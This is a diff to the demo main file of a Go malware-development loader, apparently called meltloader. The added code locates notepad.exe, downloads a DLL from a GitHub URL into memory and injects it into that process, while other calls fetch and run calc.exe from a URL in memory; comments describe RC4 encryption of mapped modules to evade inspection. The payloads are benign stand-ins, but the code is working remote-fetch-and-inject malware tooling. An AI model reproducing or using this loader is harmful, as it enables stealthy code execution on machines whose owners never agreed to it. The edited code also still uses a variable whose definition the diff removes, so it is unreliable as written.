@@ -1,16 +1,35 @@
 package main
 
 import (
-	"github.com/carved4/meltloader/pkg/pe"
 	"fmt"
+	"log"
+	"github.com/carved4/meltloader/pkg/pe"
+	"github.com/carved4/meltloader/pkg/net"
 )
 
 func main() {
+	log.Printf("[main] start")
 	// Load local test DLL that exports HostInfo (built in go-dll-src/)
-	mapping, err := pe.LoadDLLFromFile("hostinfo.dll", "HostInfo")
+	pid, pHandle, err := pe.FindTargetProcess("notepad.exe")
 	if err != nil {
-		fmt.Println("failed to load", err)
+		log.Printf("[main] failed to find process: %v", err)
+		fmt.Println("failed to find process", err)
+		return
 	}
+	log.Printf("[main] target: pid=%d handle=0x%x", pid, pHandle)
+	buff, err := net.DownloadToMemory("https://github.com/carterjones/hello-world-dll/releases/download/v1.0.0/hello-world-x64.dll")
+	if err != nil {
+		log.Printf("[main] failed to download DLL: %v", err)
+		fmt.Println("failed to download", err)
+		return
+	}
+	_, err = pe.LoadDLLRemote(pHandle, buff, "MessageBoxThread")
+	if err != nil {
+		log.Printf("[main] LoadDLLRemote failed: %v", err)
+		fmt.Println("failed to load", err)
+		return
+	}
+	log.Printf("[main] LoadDLLRemote succeeded")
 	// the downloaded buffer is optionally encrypted for an amount of time in seconds passed as an int to LoadDLLFromURL() as demonstrated in the call above and then decrypted before execution
 	// you can also call the func without the sleep parameter as displayed below
 	// the mapped DLL in memory after load and execution is encrypted in place with RC4 and will not be able to be interacted with
@@ -24,11 +43,6 @@ func main() {
 	fmt.Printf("currently have %d DLLs mapped:\n", count)
 	for i := 0; i < count; i++ {
 		fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
-	}
-	// call melt to virtualfree (feel free to change to an nt* call, but i like the reliability)
-	err = pe.Melt(mapping)
-	if err != nil {
-		fmt.Println("failed to melt dll after load:", err)
 	}
 	// call on other mapping (this takes in an interface returned into mapping and optionally unpacked for display in pe.GetMap())
 	err = pe.Melt(mapping2)
@@ -44,14 +58,14 @@ func main() {
 		fmt.Printf("DLL %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
 	}
 	// demonstrate pe loading with timer
-	peMapping, err := pe.LoadPEFromURLThreadTimed("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 1)
+	peMapping, err := pe.LoadPEFromURLThreadTimed("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
 	if err != nil {
 		fmt.Println("failed to load PE:", err)
 	} else {
 		fmt.Println("successfully loaded PE")
 	}
 	// demonstrate another pe load, should spawn two calcs by now then return to loader and print how many are mapped, then melt
-	peMapping2, err := pe.LoadPEFromURLThreadTimed("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 1)
+	peMapping2, err := pe.LoadPEFromURLThreadTimed("https://github.com/carved4/go-maldev/raw/refs/heads/main/generator/calc.exe", 2)
 	if err != nil {
 		fmt.Println("failed to load PE:", err)
 	} else {
@@ -78,5 +92,4 @@ func main() {
 	for i := 0; i < peCount; i++ {
 		fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, peBaseAddrs[i], peSizes[i])
 	}
-
 }
